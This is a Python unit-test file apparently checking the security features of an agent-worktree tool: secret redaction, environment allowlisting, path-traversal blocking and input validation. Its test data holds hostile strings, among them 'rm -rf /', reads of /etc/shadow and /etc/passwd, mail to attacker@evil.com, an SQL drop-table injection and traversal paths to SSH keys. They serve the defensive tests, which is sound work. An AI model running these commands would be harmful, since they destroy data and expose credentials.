"""Unit tests for security features."""

import re
from pathlib import Path

import pytest


class TestSecretRedaction:
    """Test secret redaction in logs (ADR-004)."""

    @pytest.mark.unit
    def test_github_token_redaction(self):
        """Test GitHub token patterns are redacted."""
        patterns = [
            ("ghp_1234567890abcdefghijklmnopqrstuvwxyz", "gh*_***"),  # pragma: allowlist secret
            ("ghs_abcdefghijklmnopqrstuvwxyz1234567890", "gh*_***"),  # pragma: allowlist secret
        ]

        for secret, expected in patterns:
            text = f"Token: {secret} in logs"
            redacted = re.sub(r"gh[ps]_[A-Za-z0-9]{36}", "gh*_***", text)
            assert expected in redacted
            assert secret not in redacted

    @pytest.mark.unit
    def test_api_key_redaction(self):
        """Test API key patterns are redacted."""
        # Test with exact length keys
        openai_key = "sk-" + "a" * 48  # OpenAI format: sk- plus 48 chars
        anthropic_key = "anthropic-" + "b" * 40  # Anthropic format: anthropic- plus 40 chars

        # Test OpenAI key redaction
        text = f"API Key: {openai_key}"
        text = re.sub(r"sk-[A-Za-z0-9]{48}", "sk-***", text)
        assert openai_key not in text
        assert "sk-***" in text

        # Test Anthropic key redaction
        text = f"API Key: {anthropic_key}"
        text = re.sub(r"anthropic-[A-Za-z0-9]{40}", "anthropic-***", text)
        assert anthropic_key not in text
        assert "anthropic-***" in text

    @pytest.mark.unit
    def test_jwt_token_redaction(self):
        """Test JWT token redaction."""
        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"  # pragma: allowlist secret
        text = f"Authorization: Bearer {jwt}"

        redacted = re.sub(r"eyJ[A-Za-z0-9\-_]*\.[A-Za-z0-9\-_]*\.[A-Za-z0-9\-_]*", "jwt-***", text)

        assert jwt not in redacted
        assert "jwt-***" in redacted

    @pytest.mark.unit
    def test_database_url_redaction(self):
        """Test database URL redaction."""
        urls = [
            "postgres://user:pass@localhost:5432/mydb",  # pragma: allowlist secret
            "mysql://admin:secret@db.example.com/production",  # pragma: allowlist secret
            "mongodb://root:topsecret@cluster.mongodb.net/app",  # pragma: allowlist secret
        ]

        pattern = r"(postgres|mysql|mongodb)://[^@]+@[^/\s]+/\w+"
        replacement = r"\1://***:***@***/***"

        for url in urls:
            text = f"Database: {url}"
            redacted = re.sub(pattern, replacement, text)

            assert "user" not in redacted
            assert "pass" not in redacted
            assert "admin" not in redacted
            assert "secret" not in redacted
            assert "***:***@***" in redacted

    @pytest.mark.unit
    def test_aws_credential_redaction(self):
        """Test AWS credential redaction."""
        aws_key = "AKIAIOSFODNN7EXAMPLE"  # pragma: allowlist secret
        aws_secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # pragma: allowlist secret

        text = f"AWS_ACCESS_KEY_ID={aws_key} AWS_SECRET_ACCESS_KEY={aws_secret}"

        # Redact AWS access key
        text = re.sub(r"AKIA[0-9A-Z]{16}", "AKIA***", text)
        # Redact AWS secret key
        text = re.sub(
            r'aws[_-]?secret[_-]?access[_-]?key["\s:=]+["\'`]?([A-Za-z0-9/+=]{40})',
            "aws_secret_access_key=***",
            text,
            flags=re.IGNORECASE,
        )

        assert aws_key not in text
        assert aws_secret not in text
        assert "AKIA***" in text


class TestEnvironmentSecurity:
    """Test environment variable security."""

    @pytest.mark.unit
    def test_environment_allowlist(self):
        """Test only allowed environment variables pass through."""
        allowed = {
            "LANG",
            "LC_ALL",
            "LC_CTYPE",
            "LC_MESSAGES",
            "LC_TIME",
            "TERM",
            "TERMINFO",
            "USER",
            "USERNAME",
            "TZ",
            "TMPDIR",
        }

        test_env = {
            "LANG": "en_US.UTF-8",
            "USER": "testuser",
            "HOME": "/home/user",  # Should be filtered
            "PATH": "/usr/bin:/bin",  # Should be filtered
            "SECRET_TOKEN": "abc123",  # Should be filtered  # pragma: allowlist secret
            "COCODE_ISSUE": "123",  # Should pass (COCODE_ prefix)
        }

        filtered = {k: v for k, v in test_env.items() if k in allowed or k.startswith("COCODE_")}

        assert "LANG" in filtered
        assert "USER" in filtered
        assert "COCODE_ISSUE" in filtered
        assert "HOME" not in filtered
        assert "PATH" not in filtered
        assert "SECRET_TOKEN" not in filtered

    @pytest.mark.unit
    def test_controlled_path(self):
        """Test PATH is constructed from safe directories only."""
        safe_dirs = ["/usr/bin", "/bin", "/usr/local/bin", "/opt/homebrew/bin"]

        safe_path = ":".join(safe_dirs)

        # Verify no user home directories (but /opt/homebrew is OK)
        assert not any(part.startswith("/home/") for part in safe_path.split(":"))
        assert "~" not in safe_path
        assert "./" not in safe_path
        assert "../" not in safe_path

        # Verify expected directories
        for dir in safe_dirs:
            assert dir in safe_path


class TestFileSystemSecurity:
    """Test filesystem security measures."""

    @pytest.mark.unit
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        from pathlib import Path

        def is_safe_path(user_path: str, base_dir: Path) -> bool:
            try:
                requested = (base_dir / user_path).resolve()
                base = base_dir.resolve()
                return requested.is_relative_to(base)
            except (ValueError, RuntimeError):
                return False

        base = Path("/tmp/cocode_workspace")

        # Safe paths
        assert is_safe_path("file.txt", base)
        assert is_safe_path("subdir/file.txt", base)
        assert is_safe_path("./current/file.txt", base)

        # Unsafe paths
        assert not is_safe_path("../etc/passwd", base)
        assert not is_safe_path("/etc/passwd", base)
        assert not is_safe_path("../../root/.ssh/id_rsa", base)
        assert not is_safe_path("subdir/../../etc/passwd", base)

    @pytest.mark.unit
    def test_worktree_isolation(self):
        """Test agents are isolated to their worktrees."""
        agent_worktree = Path("/tmp/repo/cocode_claude")
        other_worktree = Path("/tmp/repo/cocode_codex")
        main_repo = Path("/tmp/repo")

        def can_access(path: Path, worktree: Path) -> bool:
            try:
                return path.resolve().is_relative_to(worktree.resolve())
            except Exception:
                return False

        # Agent can access its own worktree
        assert can_access(agent_worktree / "src/main.py", agent_worktree)

        # Agent cannot access other worktrees
        assert not can_access(other_worktree / "src/main.py", agent_worktree)

        # Agent cannot access parent repo
        assert not can_access(main_repo / ".git/config", agent_worktree)


class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.unit
    def test_issue_number_validation(self):
        """Test issue numbers are validated."""
        valid_numbers = ["1", "123", "9999"]
        invalid_numbers = ["abc", "1a", "-1", "0", "../123", "123; rm -rf"]

        def is_valid_issue(num: str) -> bool:
            return num.isdigit() and int(num) > 0

        for num in valid_numbers:
            assert is_valid_issue(num)

        for num in invalid_numbers:
            assert not is_valid_issue(num)

    @pytest.mark.unit
    def test_branch_name_sanitization(self):
        """Test branch names are sanitized."""

        def sanitize_branch(name: str) -> str:
            # Remove invalid characters (but keep /)
            sanitized = re.sub(r"[^a-zA-Z0-9\-_/]", "-", name)
            # Remove consecutive slashes
            sanitized = re.sub(r"/+", "/", sanitized)
            # Remove leading/trailing slashes and dashes
            sanitized = sanitized.strip("/-")
            return sanitized

        tests = [
            ("feature/test", "feature/test"),
            ("feature test", "feature-test"),
            ("feat!@#$%", "feat"),
            ("//double//slash//", "double/slash"),
            ("../../../etc", "etc"),
        ]

        for input, expected in tests:
            assert sanitize_branch(input) == expected

    @pytest.mark.unit
    def test_command_injection_prevention(self):
        """Test prevention of command injection."""
        dangerous_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | mail attacker@evil.com",
            "test `cat /etc/shadow`",
            "test $(whoami)",
            "test'; DROP TABLE users; --",
        ]

        def is_safe_arg(arg: str) -> bool:
            dangerous_chars = [";", "&&", "||", "|", "`", "$", ">", "<", "&"]
            return not any(char in arg for char in dangerous_chars)

        for input in dangerous_inputs:
            assert not is_safe_arg(input)
